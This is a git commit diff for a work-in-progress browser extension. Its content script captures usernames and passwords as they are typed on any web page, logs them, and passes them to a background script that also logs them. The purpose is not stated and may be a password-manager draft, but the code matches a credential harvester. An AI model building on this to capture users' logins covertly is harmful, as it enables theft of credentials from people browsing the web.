032346eaae62216b2653827d62a5327308bf4f7d
arjun3649 <arjun.rakwal3649@gmail.com>
2024-05-19 00:18:47 +0530

    Made progress of taking inputs in

--- dist/contentScript.js
+++ dist/contentScript.js
@@ -3,63 +3,9 @@ var __webpack_exports__ = {};
 /*!********************************************!*\
   !*** ./src/contentScript/contentScript.js ***!
   \********************************************/
-// TODO: content script
-// content_script.js
 console.log("====================================");
-console.log("content script injected");
+console.log("coming from content script ");
 console.log("====================================");
-
-
-
-                // getting data from websites where <form> tag is present
-// function getCredentials(event) {
-//   event.preventDefault(); // Prevent the default form submission behavior
-
-//   const formElement = event.target;
-//   let usernameField, passwordField;
-
-//   // Loop through all input fields in the form
-//   const inputs = formElement.getElementsByTagName("input");
-//   for (let i = 0; i < inputs.length; i++) {
-//     const input = inputs[i];
-
-//     // Check if the input is a password field
-//     if (input.type === "password") {
-//       passwordField = input;
-//     }
-//     // Check if the input is a text or email field (common for usernames)
-//     else if (input.type === "text" || input.type === "email") {
-//       usernameField = input;
-//     }
-
-//     // If both username and password fields are found, exit the loop
-//     if (usernameField && passwordField) {
-//       break;
-//     }
-//   }
-
-//   // If both fields are found, log their values
-//   if (usernameField && passwordField) {
-//     const username = usernameField.value;
-//     const password = passwordField.value;
-
-//     console.log("Username:", username);
-//     console.log("Password:", password);
-
-//   } else {
-//     console.log("Username or password field not found.");
-//   }
-// }
-
-// // Add event listener to the form submission
-// const forms = document.getElementsByTagName("form");
-// for (let i = 0; i < forms.length; i++) {
-//   const form = forms[i];
-//   form.addEventListener("submit", getCredentials);
-// }
-
-
-              // getting data from input
 
 let usernameField = null;
 let passwordField = null;
@@ -69,29 +15,61 @@ let finalpassword = "";
 function handleInputEvent(event) {
   const input = event.target;
 
+  //   chrome.tabs.query({currentWindow: true, active: true}, function(tabs){
+  //     console.log(tabs[0].url);
+  // });
+
+  // Check if the input field is a text or email field (common for usernames)
+  if (
+    input.type === "email" ||
+    input.placeholder.includes("Email") ||
+    input.placeholder.includes("E-mail") ||
+    input.placeholder.includes("Username")
+  ) {
+    usernameField = input;
+  }
   // Check if the input field is a password field
   if (input.type === "password") {
     passwordField = input;
   }
-  // Check if the input field is a text or email field (common for usernames)
-  else if (input.type === "text" || input.type === "email") {
-    usernameField = input;
-  }
 
   // If both username and password fields are found, log their values
-  if (usernameField && passwordField) {
+  //   if (usernameField && passwordField) {
+  //     const username = usernameField.value;
+  //     const password = passwordField.value;
+  //     finalusername = username;
+  //     finalpassword = password;
+  //   }
+  //   console.log(finalusername);
+  //   console.log(finalpassword);
+  // }
+
+  if (usernameField) {
     const username = usernameField.value;
-    const password = passwordField.value;
     finalusername = username;
-    finalpassword = password;
+    console.log(finalusername);
   }
 
-  console.log("username:", finalusername);
-  console.log("password:", finalpassword);
+  if (passwordField) {
+    const password = passwordField.value;
+    finalpassword = password;
+    console.log(finalpassword);
+  }
+
+  
+
+   
 }
 
-// Add event listener to monitor user input on the entire document
-document.addEventListener("submit", handleInputEvent, true);
+
+document.addEventListener("input", handleInputEvent, true);
+
+const response = chrome.runtime.sendMessage({
+  uname: finalusername,
+  upass: finalpassword,
+});
+
+
 
 /******/ })()
 ;
--- src/background/background.js
+++ src/background/background.js
@@ -1,1 +1,21 @@
 // TODO: background script
+chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
+  console.log(
+    sender.tab ? "from a content script:" + sender.url : "from the extension"
+  );
+    console.log('====================================');
+    console.log(request.uname);
+    console.log('====================================');
+ 
+ 
+});
+let key = 'shishir'
+let value=[1,2,3,4,5,6,7]
+chrome.storage.sync.set({ key: value }).then(() => {
+    
+  
+});
+
+chrome.storage.sync.get(["key"]).then((result) => {
+  console.log("Value is " + result.key+"type of"+typeof(result.key));
+});
